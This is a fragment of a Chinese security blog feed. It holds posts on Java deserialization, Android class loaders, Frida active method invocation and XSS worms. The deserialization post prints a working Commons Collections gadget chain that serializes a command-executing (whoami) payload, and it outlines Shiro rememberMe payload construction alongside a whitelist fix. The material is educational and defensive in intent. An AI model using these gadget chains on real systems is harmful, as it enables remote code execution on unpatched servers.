class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="comment">// getMethod(方法名,方法类型)</span></span><br><span class="line">    <span class="comment">// invoke(某个对象实例， 传入参数)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取一个对象实例好被下一个invoke调用</span></span><br><span class="line">    Object runtime = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;).invoke(<span class="keyword">null</span>);</span><br><span class="line">    <span class="comment">// 调用上一步生成的runtime实例的exec方法，并将&quot;notepad.exe&quot;参数传入exec()方法</span></span><br><span class="line">    Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(runtime,<span class="string">&quot;notepad.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-commons-collections-反序列化漏洞分析"><a href="#2-2-commons-collections-反序列化漏洞分析" class="headerlink" title="2.2 commons-collections 反序列化漏洞分析"></a>2.2 commons-collections 反序列化漏洞分析</h3><p>org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具体的collection为set，list，queue等等，它们是集合类型。换一种理解方式，collection是set，list，queue的抽象。</p><p>Apache Commons Collections中有一个特殊的接口 Transformer，<strong>InvokerTransformer</strong> 实现了该接口，可以通过调用Java的反射机制来调用任意函数，比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>AnnotationInvocationHandler类：</strong> 这个类有一个成员变量memberValues是Map类型，而且 AnnotationInvocationHandler 的 readObject() 函数中对 memberValues 的每一项调用了 setValue() 函数，从而会触发transformer链。主要流程</p><ol><li>首先构造一个Map和一个可以执行代码的 ChainedTransformer;</li><li>生成一个 TransformerMap 实例；</li><li>实例化 AnnotationInvocationHandler，并对其进行序列化；</li><li>当触发 readObject() 反序列化的时候，就可以进行命令执行；</li></ol><p>具体实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//execArgs: 待执行的命令数组</span></span><br><span class="line">        <span class="comment">//String[] execArgs = new String[] &#123; &quot;sh&quot;, &quot;-c&quot;, &quot;whoami &gt; /tmp/fuck&quot; &#125;;</span></span><br><span class="line">        <span class="comment">//transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            由于Method类的invoke(Object obj,Object args[])方法的定义</span></span><br><span class="line"><span class="comment">            所以在反射内写new Class[] &#123;Object.class, Object[].class &#125;</span></span><br><span class="line"><span class="comment">            正常POC流程举例：</span></span><br><span class="line"><span class="comment">            ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(&quot;gedit&quot;);</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;Object.class,Object[].class &#125;, </span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">null</span> &#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String[].class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;whoami&quot;</span> &#125;</span><br><span class="line">                <span class="comment">//new Object[] &#123; execArgs &#125; </span></span><br><span class="line">            )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作</span></span><br><span class="line">        Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map&lt;String,String&gt; BeforeTransformerMap = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line"></span><br><span class="line">        BeforeTransformerMap.put(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Map数据结构，转换后的Map</span></span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。</span></span><br><span class="line"><span class="comment">            第一个参数为待转化的Map对象</span></span><br><span class="line"><span class="comment">            第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）</span></span><br><span class="line"><span class="comment">            第三个参数为Map对象内的value要经过的转化方法。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">        <span class="comment">//TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);</span></span><br><span class="line">        Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, <span class="keyword">null</span>, transformedChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, AfterTransformerMap);</span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">&quot;temp.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>如果可以明确反序列化对象类的则可在反序列化时设置白名单，对于一些只提供接口的库则可使用黑名单设置不允许被反序列化类,或者提供设置白名单的接口，(可通过Hook函数resolveClass来校验反序列化的类从而实现白名单校验)。示例如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AntObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只允许反序列化SerialObject class</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(SerialObject.class.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">                    <span class="string">&quot;Unauthorized deserialization attempt&quot;</span>,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h3><p>shiro 1.2.24以前的版本中默认使用了 cookieRemenberMeManager ,其处理cookie的流程是:</p><p><code>得到 rememberMe 的cookie值 -&gt; Base64解码 -&gt; AES解密 -&gt; 反序列化</code></p><p>由于AES的秘钥是硬编码在程序中，所以攻击者可以构造恶意数据造成反序列化的RCE漏洞。 payload 构造的顺序是相反的</p><p><code>恶意命令 -&gt; 序列化 -&gt; AES加密 -&gt;base64编码 -&gt; 发送cookie</code></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><blockquote><p> <a href="https://www.freebuf.com/vuls/270859.html">https://www.freebuf.com/vuls/270859.html</a><br> <a href="https://bbs.ichunqiu.com/thread-61162-1-1.html">https://bbs.ichunqiu.com/thread-61162-1-1.html</a><br> <a href="https://www.freebuf.com/vuls/170344.html">https://www.freebuf.com/vuls/170344.html</a><br> <a href="https://www.freebuf.com/articles/web/286658.html">https://www.freebuf.com/articles/web/286658.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-java序列化与反序列化&quot;&gt;&lt;a href=&quot;#1-java序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;1.java序列化与反序列化&quot;&gt;&lt;/a&gt;1.java序列化与反序列化&lt;/h2&gt;&lt;p&gt;在Java中，只要一个类实现了&lt;code&gt;j</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android 动态加载与类加载器</title>
    <link href="http://yejuns.github.io/2021/05/23/Android%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
    <id>http://yejuns.github.io/2021/05/23/Android%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</id>
    <published>2021-05-23T02:52:15.000Z</published>
    <updated>2021-08-29T12:10:26.457Z</updated>
    
    <content type="html"><![CDATA[<p>动态加载就是用到的时候再去加载，也就是懒加载。是dex加壳，插件化，热更新的基础:</p><ol><li>app在运行时候，通过加载一些 app 原本不存在的可执行文件，实现一些特定的功能；</li><li>更换静态资源不属于动态加载，静态资源包括：换启动图、换主题、在服务器中配置参数开关，控制广告的显示与隐藏；</li><li>动态加载的核心是：动态调用外部的 dex文件，有一种极端情况就是：Android Apk自身带有的 dex文件只是一个程序的入口，所有的功能可以直接从服务器中下载 最新的 dex 文件来完成；</li></ol><h3 id="java中的动态加载"><a href="#java中的动态加载" class="headerlink" title="java中的动态加载"></a>java中的动态加载</h3><p>java的可执行文件是jar文件，运行在JVM虚拟机上，JVM虚拟机通过 ClassLoader加载 jar文件，并且执行里边的代码逻辑。所以说：Java程序也可以通过动态的调用jar文件来达到动态加载的目的；</p><h3 id="Android中的动态加载"><a href="#Android中的动态加载" class="headerlink" title="Android中的动态加载"></a>Android中的动态加载</h3><p>Android的可执行文件是 dex文件，运行在 Dalvik/ART虚拟机上，在apk文件中会有一个或多个 dex文件，而我们写的所有的代码都会被编译到这些 dex文件中，Android运行的时候就是通过执行这些 dex文件来完成应用功能的。如果 apk文件构建出来是不能够修改里边的 dex文件，但是可以通过加载 外部SD卡的或者网络的 dex文件达到动态加载。</p><ul><li>动态加载 dex/jar 文件</li><li>动态加载 so 文件</li></ul><h3 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h3><p>JVM的类加载器包括3种：</p><ol><li><p>Bootstrap ClassLoader（引导类加载器）</p><p>C/C++代码实现的加载器，用于加载指定的JDK的核心类库，比如java.lang.、java.uti.等这些系统类。Java虚拟机的启动就是通过Bootstrap，该Classloader在java里无法获取，负责加载/lib下的类。</p></li><li><p>Extensions ClassLoader（拓展类加载器）</p><p>Java中的实现类为ExtClassLoader，提供了除了系统类之外的额外功能，可以在java里获取，负责加载/lib/ext下的类。</p></li><li><p>Application ClassLoader（应用程序类加载器）</p><p>Java中的实现类为AppClassLoader，是与我们接触对多的类加载器，开发人员写的代码默认就是由它来加载，ClassLoader.getSystemClassLoader返回的就是它。</p></li></ol><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/classLoader-1.png"></p><p>我们也可以自定义类加载器，只需要继承java.lang.ClassLoader类，实现自己的类加载器即可。同时类加载器在加载类的时候满足<strong>双亲委派模式</strong>。</p><p><strong>双亲委派模式</strong>：如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派模式，即每个儿子都不愿意干活，每次有活就丢给父亲去干，直到父亲说这件事我也干不了时，儿子自己想办法去完成。</p><p><strong>为什么要有双亲委派？</strong></p><ol><li>避免重复加载，如果已经加载过一次Class，可以直接读取已经加载的Class;</li><li>更加安全，无法自定义类来替代系统的类，可以防止核心API库被随意篡改;</li></ol><p>Android系统中与ClassLoader相关的一共有8个：</p><ol><li>ClassLoader为抽象类；</li><li>BootClassLoader预加载常用类，单例模式。与Java中的BootClassLoader不同，它并不是由C/C++代码实现，而是由Java实现的；</li><li>BaseDexClassLoader是PathClassLoader、DexClassLoader、InMemoryDexClassLoader的父类，类加载的主要逻辑都是在BaseDexClassLoader完成的。</li><li>SecureClassLoader继承了抽象类ClassLoader，拓展了ClassLoader类加入了权限方面的功能，加强了安全性;</li><li>SecureClassLoader的子类URLClassLoader是用URL路径从jar文件中加载类和资源。</li><li>PathClassLoader是Android默认使用的类加载器，一个apk中的Activity等类便是在其中加载。</li><li>DexClassLoader可以加载任意目录下的dex/jar/apk/zip文件，比PathClassLoader更灵活，是实现插件化、热修复以及dex加壳的重点。</li><li>Android8.0新引入InMemoryDexClassLoader，从名字便可看出是用于直接从内存中加载dex。</li></ol><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/classLoader-2.png"></p><p>DexClassLoader的构造方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DexClassLoader (String dexPath, String optimizedDirectory, String librarySearchPath, ClassLoader parent)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="center">dexPath</td><td align="left">包含dex文件的jar包或apk文件路径，装载器从路径中寻找指定的目标类</td></tr><tr><td align="center">optimizedDirectory</td><td align="left">由于dex文件在APK中，所以在转载前需要从里面解压出dex文件，这个路径就是dex文件的存放地址</td></tr><tr><td align="center">librarySearchPath</td><td align="left">目标类中使用的c/c++库，可为空</td></tr><tr><td align="center">parent</td><td align="left">父类加载器</td></tr></tbody></table><p>参考资料</p><blockquote><p><a href="https://www.jianshu.com/p/8fbc09adbde4">https://www.jianshu.com/p/8fbc09adbde4</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;动态加载就是用到的时候再去加载，也就是懒加载。是dex加壳，插件化，热更新的基础:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;app在运行时候，通过加载一些 app 原本不存在的可执行文件，实现一些特定的功能；&lt;/li&gt;
&lt;li&gt;更换静态资源不属于动态加载，静态资源包括：换启动图、换主题、</summary>
      
    
    
    
    
    <category term="android" scheme="http://yejuns.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向第十一课 - frida的主动调用</title>
    <link href="http://yejuns.github.io/2021/05/02/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E4%B8%80%E8%AF%BE%20/"/>
    <id>http://yejuns.github.io/2021/05/02/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E4%B8%80%E8%AF%BE%20/</id>
    <published>2021-05-02T04:01:51.000Z</published>
    <updated>2021-08-10T09:22:22.788Z</updated>
    
    <content type="html"><![CDATA[<p>除了使用frida进行hook, 很多场景我们需要用frida主动调用app的java方法和so方法。因为hook大多数时候只能被动的等待触发，如果函数一直不触发，我们就需要去主动调用。</p><h3 id="frida主动调用方法分类"><a href="#frida主动调用方法分类" class="headerlink" title="frida主动调用方法分类"></a>frida主动调用方法分类</h3><ol><li>frida 主动调用java类方法 （静态java方法）</li><li>frida 主动调用native类方法 (静态native方法）</li><li>frida 主动调用对象的java方法</li><li>frida 主动调用对象的native方法</li><li>frida 主动调用so方法</li></ol><p><strong>类方法可以直接调用 对象方法必须要有对象</strong></p><p>主动调用java静态代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call_enc</span>(<span class="params">str_data, n_cnt</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">//这里写函数对应的类名</span></span><br><span class="line">  <span class="keyword">var</span> str_cls_name = <span class="string">&quot;com.wangtietou.test_rpc_all.Test_Enc_Dec&quot;</span>;</span><br><span class="line">  <span class="comment">//返回值 </span></span><br><span class="line">  <span class="keyword">var</span> str_ret = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="comment">//打log方便调试</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;===========&gt;on enc&quot;</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取类</span></span><br><span class="line">    <span class="keyword">var</span> obj = Java.use(str_cls_name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用类方法 因为这里是静态方法 所以可以直接调用</span></span><br><span class="line">    str_ret = obj.enc(str_data, n_cnt);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//打印结果 方便调试</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;enc result: &quot;</span> + str_ret);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> str_ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主动调用对象的java方法，我们有2种选择</p><ol><li>直接获取内存中已存在的对象（建议使用）</li><li>自己创建一个新对象</li></ol><p>因为运行过程中对象的成员的值可能已经发生了变化，所以如果重新创建一个对象，新对象的值还是初始值，在调用算法或者函数的时候，可能会产生影响。<br>所以这里建议直接获取内存中已经有的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从内存中（堆）直接搜索已存在的对象</span></span><br><span class="line">Java.choose(<span class="string">&#x27;xxx.xxx.xxx &#x27;</span>， <span class="comment">//这里写类名 </span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//onMatch 匹配到对象执行的回调函数</span></span><br><span class="line">   onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="comment">//堆中搜索完成后执行的回调函数</span></span><br><span class="line">   onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call_enc</span>(<span class="params">str_data</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">//这里写函数对应的类名</span></span><br><span class="line">  <span class="keyword">var</span> str_cls_name = <span class="string">&quot;com.wangtietou.test_rpc_all.Test_Enc_Dec&quot;</span>;</span><br><span class="line">  <span class="comment">//返回值 </span></span><br><span class="line">  <span class="keyword">var</span> str_ret = <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      Java.choose(str_cls_name, </span><br><span class="line">      &#123;</span><br><span class="line">        onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//调试用</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;onMatch &quot;</span>);  </span><br><span class="line">            <span class="comment">//直接调用对象的函数 instance是找到的对象</span></span><br><span class="line">            str_ret = instance.enc(str_data);</span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;enc result: &quot;</span> + str_ret);</span><br><span class="line">  <span class="keyword">return</span> str_ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://eternalsakura13.com/2020/07/04/frida/">https://eternalsakura13.com/2020/07/04/frida/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;除了使用frida进行hook, 很多场景我们需要用frida主动调用app的java方法和so方法。因为hook大多数时候只能被动的等待触发，如果函数一直不触发，我们就需要去主动调用。&lt;/p&gt;
&lt;h3 id=&quot;frida主动调用方法分类&quot;&gt;&lt;a href=&quot;#frida主</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>web安全之XSS蠕虫</title>
    <link href="http://yejuns.github.io/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/"/>
    <id>http://yejuns.github.io/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/</id>
    <published>2021-04-21T03:01:51.000Z</published>
    <updated>2021-08-16T13:25:58.733Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xss蠕虫"><a href="#xss蠕虫" class="headerlink" title="xss蠕虫"></a>xss蠕虫</h2><p>一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安全限制，XSS 蠕虫基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户发送含有蠕虫的内容，再感染安全的用户。</p><p>举个例子，在某论坛发了一个帖子，这个帖子的内容就是一个 ajax 请求，当其他用户点击这个帖子，就会触发这个 ajax 请求，再次发布一个相同的帖子。</p><h3 id="XSS蠕虫一般原理"><a href="#XSS蠕虫一般原理" class="headerlink" title="XSS蠕虫一般原理"></a>XSS蠕虫一般原理</h3><ol><li>基于存储型XSS 漏洞，攻击者在Web 页面植入恶意代码。</li><li>发送伪装的邀请链接。</li><li>用户点击链接被感染。</li><li>新感染用户的向好友发送伪装的邀请链接。</li></ol><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><blockquote><p><a href="https://www.freebuf.com/vuls/191274.html">https://www.freebuf.com/vuls/191274.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;xss蠕虫&quot;&gt;&lt;a href=&quot;#xss蠕虫&quot; class=&quot;headerlink&quot; title=&quot;xss蠕虫&quot;&gt;&lt;/a&gt;xss蠕虫&lt;/h2&gt;&lt;p&gt;一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安全限制，XSS 蠕虫基于社会工程学诱使用户点</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向第十课 - IDA+frida联合调试</title>
    <link href="http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/"/>
    <id>http://yejuns.github.io/2021/04/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%8D%81%E8%AF%BE/</id>
    <published>2021-04-18T06:01:51.000Z</published>
    <updated>2021-08-08T13:29:04.434Z</updated>
    
